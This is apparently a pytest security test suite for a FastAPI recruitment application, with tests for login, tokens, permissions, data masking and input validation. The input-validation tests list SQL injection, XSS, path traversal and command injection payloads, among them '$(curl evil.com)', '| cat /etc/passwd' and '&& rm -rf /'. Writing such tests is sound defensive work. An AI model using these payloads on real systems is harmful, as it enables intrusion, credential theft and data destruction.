# tests/test_security.py
"""
Tests de sécurité : authentification, autorisation, injections
"""
import pytest
from fastapi import status
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from datetime import datetime, timedelta
import uuid
import jwt
from app.core.security import create_access_token

class TestAuthentication:
    """Tests d'authentification"""
    
    def test_login_valid_credentials(self, client: TestClient, test_users: tuple):
        """Login avec identifiants valides"""
        response = client.post(
            "/api/auth/login",
            data={
                "username": "admin@client1.com",
                "password": "Admin123!"
            }
        )
        
        assert response.status_code == status.HTTP_200_OK
        data = response.json()
        assert "access_token" in data
        assert "refresh_token" in data
        assert data["token_type"] == "bearer"
        assert data["user"]["email"] == "admin@client1.com"
    
    def test_login_invalid_password(self, client: TestClient, test_users: tuple):
        """Login avec mot de passe incorrect"""
        response = client.post(
            "/api/auth/login",
            data={
                "username": "admin@client1.com",
                "password": "WrongPassword"
            }
        )
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
        assert "incorrect" in response.json()["detail"].lower()
    
    def test_login_nonexistent_user(self, client: TestClient):
        """Login avec utilisateur inexistant"""
        response = client.post(
            "/api/auth/login",
            data={
                "username": "nonexistent@test.com",
                "password": "Password123!"
            }
        )
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_login_inactive_user(self, client: TestClient, db: Session, test_users: tuple):
        """Login avec compte désactivé"""
        admin_user, _, _ = test_users
        admin_user.actif = False
        db.commit()
        
        response = client.post(
            "/api/auth/login",
            data={
                "username": "admin@client1.com",
                "password": "Admin123!"
            }
        )
        
        assert response.status_code == status.HTTP_403_FORBIDDEN
        assert "désactivé" in response.json()["detail"].lower()
    
    def test_access_without_token(self, client: TestClient):
        """Accès sans token"""
        response = client.get("/api/besoins/")
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_access_with_invalid_token(self, client: TestClient):
        """Accès avec token invalide"""
        headers = {"Authorization": "Bearer invalid_token_12345"}
        response = client.get("/api/besoins/", headers=headers)
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_access_with_expired_token(self, client: TestClient, test_users: tuple):
        """Accès avec token expiré"""
        admin_user, _, _ = test_users
        
        # Créer un token expiré
        expired_token = create_access_token(
            data={"sub": str(admin_user.id), "client_id": str(admin_user.client_id)},
            expires_delta=timedelta(seconds=-1)  # Expiré
        )
        
        headers = {"Authorization": f"Bearer {expired_token}"}
        response = client.get("/api/besoins/", headers=headers)
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_logout_invalidates_session(self, client: TestClient, auth_headers: dict):
        """Logout invalide la session"""
        # D'abord vérifier que le token fonctionne
        response = client.get("/api/auth/me", headers=auth_headers["regular"])
        assert response.status_code == status.HTTP_200_OK
        
        # Logout
        response = client.post("/api/auth/logout", headers=auth_headers["regular"])
        assert response.status_code == status.HTTP_200_OK
        
        # Le token ne devrait plus fonctionner
        # Note: implémenter la vérification de session révoquée dans get_current_user

class TestAuthorization:
    """Tests d'autorisation et permissions"""
    
    def test_regular_user_cannot_access_admin_endpoints(
        self, 
        client: TestClient, 
        auth_headers: dict
    ):
        """Un utilisateur normal ne peut pas accéder aux endpoints admin"""
        # Essayer d'accéder à un endpoint admin (si existe)
        # Par exemple, désactiver un autre utilisateur
        response = client.put(
            "/api/users/deactivate/some_id",
            headers=auth_headers["regular"]
        )
        
        # Devrait être interdit ou non trouvé
        assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND]
    
    def test_rate_limiting(self, client: TestClient):
        """Test de rate limiting (si implémenté)"""
        # Faire beaucoup de requêtes rapidement
        responses = []
        for _ in range(50):
            response = client.post(
                "/api/auth/login",
                data={"username": "test@test.com", "password": "wrong"}
            )
            responses.append(response.status_code)
        
        # Devrait avoir des 429 (Too Many Requests) si rate limiting actif
        # Sinon, au moins vérifier que les requêtes échouent correctement
        assert all(r in [401, 429] for r in responses)

class TestInputValidation:
    """Tests de validation des entrées et protection contre injections"""
    
    def test_sql_injection_in_search(self, client: TestClient, auth_headers: dict):
        """Protection contre injection SQL dans la recherche"""
        malicious_inputs = [
            "'; DROP TABLE candidats; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --"
        ]
        
        for malicious_input in malicious_inputs:
            response = client.get(
                f"/api/candidats/?search={malicious_input}",
                headers=auth_headers["regular"]
            )
            
            # Ne doit pas crasher et doit retourner une réponse valide
            assert response.status_code in [status.HTTP_200_OK, status.HTTP_400_BAD_REQUEST]
            
            # Si 200, vérifier qu'aucune donnée sensible n'est exposée
            if response.status_code == status.HTTP_200_OK:
                data = response.json()
                assert isinstance(data, list)
    
    def test_xss_prevention_in_input(self, client: TestClient, auth_headers: dict):
        """Protection contre XSS dans les entrées"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"
        ]
        
        for payload in xss_payloads:
            response = client.post(
                "/api/besoins/",
                headers=auth_headers["regular"],
                json={
                    "poste_recherche": payload,
                    "description": f"Test XSS: {payload}",
                    "ville": "Paris"
                }
            )
            
            if response.status_code == status.HTTP_201_CREATED:
                created = response.json()
                # Les données doivent être échappées ou nettoyées
                assert "<script>" not in created.get("poste_recherche", "")
                assert "javascript:" not in created.get("description", "")
    
    def test_path_traversal_in_file_upload(self, client: TestClient, auth_headers: dict):
        """Protection contre path traversal dans upload de fichiers"""
        import io
        
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../etc/shadow",
            "test/../../../secret.txt"
        ]
        
        for filename in malicious_filenames:
            file_content = b"test content"
            file = io.BytesIO(file_content)
            
            response = client.post(
                "/api/uploads/candidats",
                headers=auth_headers["regular"],
                files={"file": (filename, file, "text/plain")}
            )
            
            # Doit rejeter ou nettoyer le nom de fichier
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_415_UNSUPPORTED_MEDIA_TYPE,
                status.HTTP_201_CREATED
            ]
            
            if response.status_code == status.HTTP_201_CREATED:
                # Vérifier que le chemin est sécurisé
                result = response.json()
                assert ".." not in result.get("path", "")
    
    def test_integer_overflow_in_pagination(self, client: TestClient, auth_headers: dict):
        """Protection contre integer overflow dans la pagination"""
        large_numbers = [
            999999999999999999,
            -1,
            2**63,  # Max int64 + 1
            float('inf')
        ]
        
        for number in large_numbers:
            response = client.get(
                f"/api/candidats/?skip={number}&limit=10",
                headers=auth_headers["regular"]
            )
            
            # Doit gérer gracieusement
            assert response.status_code in [
                status.HTTP_200_OK,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
    
    def test_json_bomb_protection(self, client: TestClient, auth_headers: dict):
        """Protection contre JSON bombs"""
        # Créer un JSON profondément imbriqué
        nested = {"a": "b"}
        for _ in range(1000):
            nested = {"nested": nested}
        
        response = client.post(
            "/api/besoins/",
            headers=auth_headers["regular"],
            json={
                "poste_recherche": "Test",
                "metadata": nested  # JSON bomb
            }
        )
        
        # Doit rejeter ou limiter la profondeur
        assert response.status_code in [
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
            status.HTTP_422_UNPROCESSABLE_ENTITY
        ]
    
    def test_command_injection_in_parameters(self, client: TestClient, auth_headers: dict):
        """Protection contre injection de commandes"""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(curl evil.com)",
            "&& rm -rf /"
        ]
        
        for payload in command_payloads:
            response = client.get(
                f"/api/candidats/?search={payload}",
                headers=auth_headers["regular"]
            )
            
            # Ne doit pas exécuter de commandes
            assert response.status_code in [status.HTTP_200_OK, status.HTTP_400_BAD_REQUEST]

class TestDataProtection:
    """Tests de protection des données sensibles"""
    
    def test_password_not_in_response(self, client: TestClient, auth_headers: dict):
        """Les mots de passe ne sont jamais dans les réponses"""
        response = client.get("/api/auth/me", headers=auth_headers["regular"])
        
        assert response.status_code == status.HTTP_200_OK
        user_data = response.json()
        
        # Vérifier qu'aucun champ sensible n'est exposé
        assert "password" not in user_data
        assert "password_hash" not in user_data
        assert "hashed_password" not in user_data
    
    def test_sensitive_data_masked_in_logs(self, client: TestClient, caplog):
        """Les données sensibles sont masquées dans les logs"""
        import logging
        caplog.set_level(logging.INFO)
        
        # Faire un login
        client.post(
            "/api/auth/login",
            data={
                "username": "test@test.com",
                "password": "SuperSecret123!"
            }
        )
        
        # Vérifier que le mot de passe n'est pas dans les logs
        for record in caplog.records:
            assert "SuperSecret123!" not in record.message
            # Les tokens ne doivent pas être loggués en clair
            if "Bearer" in record.message:
                assert len(record.message) < 100  # Token tronqué
    
    def test_error_messages_dont_leak_info(self, client: TestClient):
        """Les messages d'erreur ne révèlent pas d'infos sensibles"""
        # Essayer de se connecter avec différents cas
        response1 = client.post(
            "/api/auth/login",
            data={"username": "exists@test.com", "password": "wrong"}
        )
        
        response2 = client.post(
            "/api/auth/login",
            data={"username": "notexists@test.com", "password": "wrong"}
        )
        
        # Les deux doivent retourner le même message générique
        assert response1.json()["detail"] == response2.json()["detail"]
        
        # Ne doit pas dire "utilisateur n'existe pas" vs "mot de passe incorrect"
        assert "n'existe pas" not in response1.json()["detail"].lower()
        assert "utilisateur inconnu" not in response2.json()["detail"].lower()